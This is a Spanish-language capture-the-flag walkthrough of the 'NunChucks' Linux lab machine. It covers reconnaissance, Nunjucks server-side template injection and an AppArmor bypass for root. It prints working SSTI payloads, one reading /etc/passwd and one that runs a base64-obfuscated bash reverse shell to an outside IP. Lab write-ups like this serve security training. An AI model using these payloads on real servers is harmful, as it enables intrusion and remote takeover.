# NunChucks

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: NodeJS SSTI (Server Side Template Injection) /
AppArmor Profile Bypass (Privilege Escalation)

Te prepara para las **Certificaciones**: eJPT /
eWPT<br><br>

![image](https://github.com/user-attachments/assets/4cd747b1-3746-4107-a796-38872cc4664c)<br><br>

# Reconocimiento

Utilizando `nmap` escaneamos todos los puertos<br>

![image](https://github.com/user-attachments/assets/339245f0-3c9a-4303-ac50-7a6a8df7cba5)<br>

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>


Utilizando `wfuzz` Buscamos subdominios y encontramos "store" (lo metemos en el `vim /etc/hosts`)<br>

![image](https://github.com/user-attachments/assets/22306a82-dd42-443f-a63d-09f03a7f90a0)<br>

- `-c` ->  Que me reporte colores 
- `-u` -> Indicar URL
- `-w` ->  Indicar diccionario que voy a utilizar
- `-t` -> Numero de hilos que voy a usar
- `-H ` -> Para que me busque el subdominio<br><br>

# Explotación SSTI

En `https://store.nunchucks.htb/` Encontramos vulnerabilidad SSTI<br>


Buscamos la Query:<br>

https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine <br>

```

{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}

```
<br>
Vemos el usuario **david**<br>

![image](https://github.com/user-attachments/assets/8b58399c-c5be-4b57-828d-7d3b59506b39)<br><br>


Nos entablamos una reverse shell `{{range.constructor("return global.process.mainModule.require('child_process').execSync(' echo IyEvYmluL2Jhc2gKCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTYvNDQzIDA+JjEK | base64 -d | bash')")()}}`<br><br>


![image](https://github.com/user-attachments/assets/dd333bf9-2db8-4ef8-be47-49b447936e9d)<br>
![image](https://github.com/user-attachments/assets/0d2213e5-ccdd-49dc-9dc6-41df78a27d43)<br><br>


# Escalamos Privilegios

Flag de usuario:<br>

![image](https://github.com/user-attachments/assets/0a277bda-0571-4b22-b61e-f01395a94d17)<br><br>


Utilizando `getcap -r / 2>/dev/null` vemos `perl` vulnerable, pero no permite escalar privilegios por que esta protegido con AppArmor.<br>

![image](https://github.com/user-attachments/assets/c086498f-05af-44dc-bf90-9d7b7c45bb27)<br><br>


##### Buscamos un bug de AppArmor con perl

AppArmor perl bugs <br>

https://bugs.launchpad.net/apparmor/+bug/1911431 -> hacer un script nombrando el shebang<br>

Me lanzo una bash privilegiada:<br>

![image](https://github.com/user-attachments/assets/ef22c059-ec72-470b-9068-a50842d6bd42)<br><br>


Le damos permisos de ejecución y ejecutamos<br>

![image](https://github.com/user-attachments/assets/2cc57373-ab7f-448b-89c0-487eac9598c0)<br><br>

Flag Final:<br>

![image](https://github.com/user-attachments/assets/c6aa6001-4d58-44c3-a877-cea5cd8eff2b)<br><br>

